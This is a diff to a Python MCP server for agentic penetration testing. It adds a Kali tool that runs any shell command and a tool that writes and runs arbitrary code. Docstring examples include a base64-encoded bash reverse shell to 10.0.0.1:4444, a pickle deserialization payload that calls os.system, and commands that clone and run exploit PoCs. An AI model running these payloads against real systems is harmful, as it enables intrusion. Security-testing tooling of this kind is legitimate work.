@@ -1,12 +1,14 @@
 """
-Network Recon MCP Server - HTTP Client & Port Scanner
+Network Recon MCP Server - HTTP Client, Port Scanner & General Shell
 
-Exposes curl HTTP client and naabu port scanner as MCP tools
-for agentic penetration testing.
+Exposes curl HTTP client, naabu port scanner, and general command execution
+as MCP tools for agentic penetration testing.
 
 Tools:
     - execute_curl: Execute curl with any CLI arguments
     - execute_naabu: Execute naabu with any CLI arguments
+    - kali_shell: Execute any shell command in the Kali sandbox
+    - execute_code: Write code to file and execute (no shell escaping needed)
 """
 
 from fastmcp import FastMCP
@@ -158,6 +160,181 @@ def execute_naabu(args: str) -> str:
         return "[ERROR] Command timed out after 300 seconds. Consider using a smaller port range or higher rate."
     except FileNotFoundError:
         return "[ERROR] naabu not found. Ensure it is installed and in PATH."
+    except Exception as e:
+        return f"[ERROR] {str(e)}"
+
+
+@mcp.tool()
+def kali_shell(command: str) -> str:
+    """
+    Execute any shell command in the Kali Linux sandbox.
+
+    Full access to the Kali Linux environment including all installed tools.
+    Use for running exploit scripts, downloading PoCs, encoding payloads,
+    or using any Kali tool not exposed as a dedicated MCP tool.
+
+    Args:
+        command: The full shell command to execute (run via bash -c)
+
+    Returns:
+        Command output (stdout + stderr combined)
+
+    Examples:
+        Run a Python exploit script:
+        - "python3 -c 'import requests; r=requests.get(\"http://10.0.0.5/\"); print(r.text)'"
+
+        Download a PoC from GitHub:
+        - "git clone https://github.com/user/CVE-2021-XXXXX-PoC.git /tmp/poc"
+
+        Run downloaded exploit:
+        - "cd /tmp/poc && python3 exploit.py http://10.0.0.5"
+
+        Use netcat for port check:
+        - "nc -zv 10.0.0.5 80"
+
+        Base64 encode a payload:
+        - "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64"
+
+        Check installed tools:
+        - "which sqlmap nikto wfuzz ffuf hydra"
+    """
+    try:
+        result = subprocess.run(
+            ["bash", "-c", command],
+            capture_output=True,
+            text=True,
+            timeout=120
+        )
+        output = result.stdout
+        if result.stderr:
+            output += f"\n[STDERR]: {result.stderr}"
+        return output if output.strip() else "[INFO] Command completed with no output"
+    except subprocess.TimeoutExpired:
+        return "[ERROR] Command timed out after 120 seconds."
+    except Exception as e:
+        return f"[ERROR] {str(e)}"
+
+
+@mcp.tool()
+def execute_code(code: str, language: str = "python", filename: str = "exploit") -> str:
+    """
+    Write code to a file and execute it with the appropriate interpreter.
+
+    Eliminates shell escaping issues by receiving code as a clean string parameter,
+    writing it to a file using a heredoc, and executing the file directly.
+    Use this instead of kali_shell when running multi-line scripts.
+
+    Args:
+        code: The source code to execute. Multi-line code with proper indentation
+              is fully supported — no shell escaping needed.
+        language: Programming language (default: "python"). Determines file extension
+                  and interpreter. Supported: python, bash, ruby, perl, c, cpp
+        filename: Base filename without extension (default: "exploit").
+                  File is created at /tmp/{filename}.{ext}
+
+    Returns:
+        Combined stdout + stderr from execution, or compilation error for compiled languages.
+
+    Examples:
+        Python exploit script:
+        - code: "import requests\\nr = requests.post('http://10.0.0.5/vuln', data={'cmd': 'id'})\\nprint(r.text)"
+
+        Python deserialization payload:
+        - code: "import pickle, base64, os\\nclass E:\\n    def __reduce__(self):\\n        return (os.system, ('id',))\\nprint(base64.b64encode(pickle.dumps(E())).decode())"
+
+        Bash enumeration script:
+        - code: "#!/bin/bash\\nfor port in 80 443 8080; do\\n  curl -s -o /dev/null -w \\"%{http_code} $port\\\\n\\" http://10.0.0.5:$port/\\ndone"
+          language: "bash"
+
+        C exploit (compiled with gcc):
+        - code: "#include <stdio.h>\\nint main() { printf(\\"uid=%d\\\\n\\", getuid()); return 0; }"
+          language: "c"
+    """
+    if not code or not code.strip():
+        return "[ERROR] No code provided to execute"
+
+    # Normalize language and map to (extension, interpreter_or_None)
+    language = language.lower().strip()
+    LANG_MAP = {
+        "python": ("py", "python3"),
+        "py":     ("py", "python3"),
+        "bash":   ("sh", "bash"),
+        "sh":     ("sh", "bash"),
+        "shell":  ("sh", "bash"),
+        "ruby":   ("rb", "ruby"),
+        "rb":     ("rb", "ruby"),
+        "perl":   ("pl", "perl"),
+        "pl":     ("pl", "perl"),
+        "c":      ("c",  None),
+        "cpp":    ("cpp", None),
+        "c++":    ("cpp", None),
+    }
+
+    if language not in LANG_MAP:
+        supported = sorted(set(LANG_MAP.keys()))
+        return f"[ERROR] Unsupported language: '{language}'. Supported: {', '.join(supported)}"
+
+    ext, interpreter = LANG_MAP[language]
+
+    # Sanitize filename to prevent path traversal / shell injection
+    safe_filename = re.sub(r'[^a-zA-Z0-9_-]', '_', filename)
+    filepath = f"/tmp/{safe_filename}.{ext}"
+    binary_path = f"/tmp/{safe_filename}"
+
+    # Step 1: Write code to file using single-quoted heredoc (no shell interpretation)
+    write_cmd = f"cat << 'REDAMON_CODE_EOF' > {filepath}\n{code}\nREDAMON_CODE_EOF"
+    try:
+        write_result = subprocess.run(
+            ["bash", "-c", write_cmd],
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        if write_result.returncode != 0:
+            return f"[ERROR] Failed to write code file: {write_result.stderr}"
+    except Exception as e:
+        return f"[ERROR] Failed to write code file: {str(e)}"
+
+    # Step 2: Execute (interpreted) or compile+execute (compiled)
+    try:
+        if interpreter:
+            # Interpreted language — run directly
+            result = subprocess.run(
+                [interpreter, filepath],
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+        else:
+            # Compiled language — compile first, then execute
+            compiler = "gcc" if ext == "c" else "g++"
+            compile_result = subprocess.run(
+                [compiler, filepath, "-o", binary_path],
+                capture_output=True,
+                text=True,
+                timeout=60
+            )
+            if compile_result.returncode != 0:
+                return f"[ERROR] Compilation failed:\n{compile_result.stderr}"
+
+            result = subprocess.run(
+                [binary_path],
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+
+        output = result.stdout
+        if result.stderr:
+            output += f"\n[STDERR]: {result.stderr}"
+        if result.returncode != 0 and not output.strip():
+            return f"[ERROR] Code exited with code {result.returncode}"
+        return output if output.strip() else "[INFO] Code executed with no output"
+
+    except subprocess.TimeoutExpired:
+        return "[ERROR] Code execution timed out after 120 seconds."
+    except FileNotFoundError as e:
+        return f"[ERROR] Interpreter/compiler not found: {str(e)}"
     except Exception as e:
         return f"[ERROR] {str(e)}"
 
